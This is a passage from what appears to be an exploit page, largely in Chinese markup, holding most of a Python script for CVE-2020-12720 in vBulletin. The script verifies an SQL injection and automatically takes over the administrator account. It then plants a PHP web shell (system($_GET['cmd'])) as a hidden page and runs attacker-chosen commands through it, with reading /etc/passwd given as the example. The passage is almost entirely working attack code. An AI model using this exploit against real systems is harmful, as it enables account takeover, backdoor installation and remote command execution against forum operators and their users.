&#39;isAjaxTemplateRenderWithData&#39;:&#39;true&#39;,&#39;securitytoken&#39;:&#39;1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;oResponse = getData(sURL + sPath, lData)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not oResponse.code == 200:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Error activating sitebuilder&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Confirming the password, getting new securitytoken</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;auth/ajax-login&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;logintype&#39;:&#39;cplogin&#39;,&#39;userid&#39;:sUserid,&#39;password&#39;:sADMINPASS,&#39;securitytoken&#39;:&#39;1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;oResponse = getData(sURL + sPath, lData)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = oResponse.read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;lostpw&#39; in sResponse:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Error: authentication for userid &#39; + sUserid + &#39; failed&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sToken = sResponse.split(&#39;,&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;}&#39;,&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[+] Got token: &#39;+sToken)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## cpsession is needed, use this for extra verification</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#for cookie in cj: print(cookie.name, cookie.value, cookie.domain) #etc etc</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## First see if our backdoor does not already exists</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;ajax/render/admin_sbpanel_pagelist_content_wrapper&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;isAjaxTemplateRenderWithData&#39;:&#39;true&#39;,&#39;securitytoken&#39;:sToken}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;oResponse = getData(sURL + sPath, lData)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = oResponse.read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;cve-2020-12720&#39; in sResponse:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sPageName = &#39;cve-2020-12720-&#39; + sResponse.split(&#39;/cve-2020-12720-&#39;)[1].split(&#39;)&#39;)[0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[+] This machine was already pwned, using &quot;&#39; + sPageName + &#39;&quot; for your command&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return sPageName</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Create a new empty page</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;ajax/api/widget/saveNewWidgetInstance&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;containerinstanceid&#39;:&#39;0&#39;,&#39;widgetid&#39;:&#39;23&#39;,&#39;pagetemplateid&#39;:&#39;&#39;,&#39;securitytoken&#39;:sToken}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;oResponse = getData(sURL + sPath, lData)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = oResponse.read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sWidgetInstanceID = sResponse.split(&#39;,&#39;)[0].split(&#39;:&#39;)[1].replace(&#39;}&#39;,&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPageTemplateID = sResponse.split(&#39;,&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;}&#39;,&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[+] Got WidgetInstanceID: &#39;+sWidgetInstanceID+&#39; and PageTemplateID: &#39;+sPageTemplateID)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Now submitting the page content</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPageName = &#39;cve-2020-12720-&#39;+randomString()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;ajax/api/widget/saveAdminConfig&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;widgetid&#39;:&#39;23&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;pagetemplateid&#39;:sPageTemplateID,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;widgetinstanceid&#39;:sWidgetInstanceID,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data[widget_type]&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data[title]&#39;:sPageName,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data[show_at_breakpoints][desktop]&#39;:&#39;1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data[show_at_breakpoints][small]&#39;:&#39;1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data[show_at_breakpoints][xsmall]&#39;:&#39;1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data[hide_title]&#39;:&#39;0&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data[module_viewpermissions][key]&#39;:&#39;show_all&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data[code]&#39;:&quot;echo(&#39;###SHELLRESULT###&#39;);system($_GET[&#39;cmd&#39;]);echo(&#39;###SHELLRESULT###&#39;);&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;securitytoken&#39;:sToken}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;oResponse = getData(sURL + sPath, lData)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not oResponse.code == 200: print(&#39;[!] Error submitting page content for &#39; + sPageName)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Finally saving the new page</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;admin/savepage&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;input[ishomeroute]&#39;:&#39;0&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[pageid]&#39;:&#39;0&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[nodeid]&#39;:&#39;0&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[userid]&#39;:&#39;1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[screenlayoutid]&#39;:&#39;2&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[templatetitle]&#39;:sPageName,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[displaysections[0]]&#39;:&#39;[{&quot;widgetId&quot;:&quot;23&quot;,&quot;widgetInstanceId&quot;:&quot;&#39; + sWidgetInstanceID + &#39;&quot;}]&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[displaysections[1]]&#39;:&#39;[]&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[displaysections[2]]&#39;:&#39;[]&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[displaysections[3]]&#39;:&#39;[]&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[pagetitle]&#39;:sPageName,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[resturl]&#39;:sPageName,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[metadescription]&#39;:&#39;Photubias+Shell&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;input[pagetemplateid]&#39;:sPageTemplateID,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;url&#39;:sURL,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;securitytoken&#39;:sToken}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;oResponse = getData(sURL + sPath, lData)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not oResponse.code == 200: print(&#39;[!] Error saving page content for &#39; + sPageName)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return sPageName</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def main():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if len(sys.argv) == 1:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[!] No arguments found: python3 CVE-2020-12720.py &lt;URL&gt; &lt;CMD&gt;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39; &nbsp;&nbsp;&nbsp;Example: ./CVE-2020-12720.py http://192.168.50.130/ &quot;cat /etc/passwd&quot;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39; &nbsp;&nbsp;&nbsp;But for now, ask questions then&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sURL = input(&#39;[?] Please enter the address and path to vBulletin ([http://192.168.50.130/): &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if sURL == &#39;&#39;: sURL = &#39;http://192.168.50.130&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sURL = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sCMD = sys.argv[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not sURL[:-1] == &#39;/&#39;: sURL += &#39;/&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not sURL[:4].lower() == &#39;http&#39;: sURL = &#39;http://&#39; + sURL</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[+] Welcome, first verifying the SQLi vulnerability&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if verifyBug(sURL):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;----\n&quot; + &#39;[+] Attempting automatic admin account takeover&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sUSERID = takeoverAccount(sURL, sNEWPASS)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sADMINPASS = sNEWPASS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if sUSERID == &#39;&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sUSERID = &#39;1&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sADMINPASS = input(&#39;[?] Please enter the admin password (userid &#39; + sUSERID + &#39;): &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sADMINPASS = input(&#39;[?] Please enter the admin password (userid &#39; + sUSERID + &#39;): &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;----\n&quot;+&#39;[+] So far so good, attempting the creation of the backdoor&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPageName = createBackdoor(sURL, sADMINPASS, sUSERID)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if len(sys.argv) == 1: sCMD = input(&#39;[?] Please enter the command to run [id]: &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if sCMD == &#39;&#39;: sCMD = &#39;id&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sCmd = &nbsp;urllib.parse.quote(sCMD)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = sPageName + &quot;?cmd=&quot; + sCmd</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[+] Opening &#39;+sURL + sPath)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oRequest = urllib.request.Request(url = sURL + sPath)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oResponse = oOpener.open(oRequest, timeout = iTimeout)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;#######################&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sResponse = oResponse.read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[+] Command result:&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(sResponse.split(&#39;###SHELLRESULT###&#39;)[1])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Something went wrong, bad command?&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;main()</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://mp.weixin.qq.com/s/U-MiFkBiY6fF44xfwAV-Ng</span></p></body>
</html>
